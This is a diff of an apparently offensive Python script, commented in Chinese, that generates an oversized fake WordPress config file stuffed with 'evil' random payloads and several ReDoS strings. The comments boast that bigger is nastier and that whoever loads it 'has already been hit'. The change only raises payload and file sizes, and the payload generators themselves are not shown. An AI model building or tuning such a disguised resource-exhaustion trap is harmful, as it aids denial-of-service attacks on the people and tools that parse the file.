@@ -48,7 +48,7 @@ def create_deadly_wp_config(target_size_mb: int = 25):
     print(f"📍 生成路径：{filename}")
     
     # 生成所有邪恶 payload
-    random_payload = generate_random_evil_payload(target_length=target_size_mb * 1_500_000)  # 随机部分占大头
+    random_payload = generate_random_evil_payload(target_length=target_size_mb * 1_000_000)  # 随机部分占大头
     redos_a = generate_redos_a()
     redos_0 = generate_redos_0()
     redos_email = generate_email_redos()
@@ -107,4 +107,4 @@ echo "WP Config loaded... (其实你已经中招了)";
 
 if __name__ == "__main__":
     # 这里改大小（MB），建议 25~50，越大越狠
-    create_deadly_wp_config(target_size_mb=16)
+    create_deadly_wp_config(target_size_mb=25)
